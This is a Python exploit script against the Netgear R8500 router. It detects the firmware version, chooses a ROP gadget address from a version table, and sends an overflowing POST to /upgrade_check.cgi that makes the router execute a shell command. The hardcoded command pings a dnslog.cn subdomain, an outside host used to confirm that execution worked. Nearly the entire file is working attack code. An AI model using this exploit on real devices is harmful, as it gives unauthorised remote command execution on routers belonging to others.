# -*- encoding:utf-8 -*-
import argparse
import socket
import struct
import sys
# from urlparse import urlparse
from urllib.parse import urlparse

address_info = {"R8500": {
    # 0) gadget: calls system($sp)
    "1.0.2.130": 0x35b18,
    "1.0.2.128": 0x35B18,
    "1.0.2.122": 0x355fc,
    "1.0.2.116": 0x35258,
    "1.0.2.106": 0x34f40,
    "1.0.2.100": 0x34d38,
    "1.0.2.94": 0x34d8c,
    "1.0.2.86": 0x348b8,
    "1.0.2.80": 0x348b8,
    "1.0.2.64": 0x34104,
    "1.0.2.54": 0x33f30,
    "1.0.2.30": 0x33dd4,
    "1.0.2.26": 0x33d9c,
    "1.0.0.56": 0x33da8,
    "1.0.0.52": 0x33da8,
    "1.0.0.42": 0x33da8,
    "1.0.0.28": 0x33da8,
}}

firmware_version_to_human_version = {"R8500": {
    "V1.0.2.130_1.0.99": "1.0.2.130",
    "V1.0.2.128_1.0.97": "1.0.2.128",
    "V1.0.2.122_1.0.94": "1.0.2.122",
    "V1.0.2.116_1.0.90": "1.0.2.116",
    "V1.0.2.106_1.0.85": "1.0.2.106",
    "V1.0.2.100_1.0.82": "1.0.2.100",
    "V1.0.2.94_1.0.79": "1.0.2.94",
    "V1.0.2.86_1.0.75": "1.0.2.86",
    "V1.0.2.80_1.0.71": "1.0.2.80",
    "V1.0.2.64_1.0.62": "1.0.2.64",
    "V1.0.2.54_1.0.56": "1.0.2.54",
    "V1.0.2.30_1.0.43": "1.0.2.30",
    "V1.0.2.26_1.0.41": "1.0.2.26",
    "V1.0.0.56_1.0.28": "1.0.0.56",
    "V1.0.0.52_1.0.26": "1.0.0.52",
    "V1.0.0.42_1.0.23": "1.0.0.42",
    "V1.0.0.28_1.0.15": "1.0.0.28",
}}


def send_plain(ip, port, payload, keep_open):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(payload)
    if keep_open:
        return sock
    sock.close()


def send_ssl(ip, port, payload, keep_open):
    import ssl
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = ssl.wrap_socket(sock)
    wrappedSocket.connect((ip, port))
    wrappedSocket.send(payload)
    if keep_open:
        return wrappedSocket
    wrappedSocket.close()


def send(ip, port, is_https, payload, keep_open=False):
    if is_https:
        return send_ssl(ip, port, payload, keep_open)
    else:
        return send_plain(ip, port, payload, keep_open)


def find_item(contents, start_string):
    start = contents.find(start_string)
    if start == -1:
        print("Failed to automatically detect version.")
        sys.exit(1)

    start += len(start_string)
    end = contents.find("\r\n", start)
    return contents[start:end].upper()  # upper just in case


def p32(address, model):
    return struct.pack("<I", address)


def detect_model_version(ip, port, is_https):
    request = "GET /currentsetting.htm HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip + ':' + str(port))
    sock = send(ip, port, is_https, request, True)

    contents = ""
    while contents.find("InternetConnectionStatus") == -1 and contents.find("401 Unauthorized") == -1:
        contents += sock.recv(1)

    # Some older models/versions don't have the currentsetting.htm page, or it's protected by login
    if contents.find("401 Unauthorized") != -1:
        print("Version detection against this router is not possible using currentsetting.htm.")
        print("Received response:\n{}\n".format(contents))
        sys.exit(1)

    model = find_item(contents, "Model=")
    firmware_version = find_item(contents, "Firmware=")
    if model != "R8500":
        print("Unknown model: {}".format(model))
        sys.exit(1)

    if firmware_version not in firmware_version_to_human_version[model]:
        print("Unknown model and version: {} {}".format(model, firmware_version))
        sys.exit(1)

    return model, firmware_version_to_human_version[model][firmware_version]


def main(url, cmd):
    ip = urlparse(url).hostname
    port = urlparse(url).port
    scheme = urlparse(url).scheme
    is_https = False
    if scheme == "https":
        is_https = True
    model, version = detect_model_version(ip, port, is_https)

    if version not in address_info[model]:
        print("This exploit does not have a ROP gadget for the selected version ({}).".format(version))
        sys.exit(1)

    # Generate the payload
    rop_gadget = address_info[model][version]
    if type(rop_gadget) == list:
        rop_gadget = [p32(x, model) for x in rop_gadget]
    else:
        rop_gadget = p32(rop_gadget, model)

    data = ""
    data += "*#$^\x00"  # marker
    data += "\x00\x04\x00"  # size
    data += "A" * 0x60
    data += "B" * 0x4  # r4
    data += "C" * 0x4  # r5
    data += "D" * 0x4  # r6
    data += "E" * 0x4  # r7
    data += "F" * 0x4  # r8
    data += "G" * 0x4  # r9
    data += "H" * 0x4  # r10
    data += "I" * 0x4  # r11
    data += rop_gadget  # pc
    data += cmd + "\x00"  # Add the command and then NULL-terminate it
    data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

    # Some of the different models/versions use different names for the argument
    argument_name = "mtenFWUpload"

    payload = ''
    payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
    payload += 'Host: {}\r\n'.format(ip + ':' + str(port))
    payload += 'Content-Disposition: AAAA\r\n'
    payload += 'Content-Length: {}\r\n'.format(len(data))
    payload += 'Content-Type: application/octet-stream\r\n'
    payload += 'name="{}"\r\n'.format(argument_name)
    payload += '\r\n'
    payload += data

    send(ip, port, is_https, payload)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target Host')
    parser.add_argument('-i', '--id', help='id')
    parser.add_argument('-s', '--server', default='127.0.0.1', help='dlserver')
    args = parser.parse_args()
    command = "ping -c 5  vmxaqf.dnslog.cn"
    main(args.target, command)
